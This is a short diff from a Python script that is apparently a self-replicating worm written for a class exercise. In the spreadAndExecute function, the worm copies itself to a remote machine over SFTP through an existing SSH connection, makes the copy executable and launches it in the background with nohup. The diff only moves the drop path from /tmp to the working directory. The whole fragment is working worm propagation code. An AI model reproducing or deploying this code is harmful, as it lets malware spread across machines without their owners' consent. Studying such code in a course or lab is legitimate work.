@@ -66,14 +66,14 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.	
-	wormLoc = "/tmp/replicator_worm.py"	
+	wormLoc = "./worm.py"	
 	if len(sys.argv) >= 2:
 		if sys.argv[1] == "--host":
-			wormLoc = "replicator_worm.py"
+			wormLoc = "worm.py"
 	sftpClient = sshClient.open_sftp()
-	sftpClient.put(wormLoc, "/tmp/worm.py")
-	sshClient.exec_command("chmod a+x /tmp/worm.py")
-	sshClient.exec_command("nohup python /tmp/worm.py &")
+	sftpClient.put(wormLoc, "./worm.py")
+	sshClient.exec_command("chmod a+x ./worm.py")
+	sshClient.exec_command("nohup python ./worm.py &")
 	
 
 
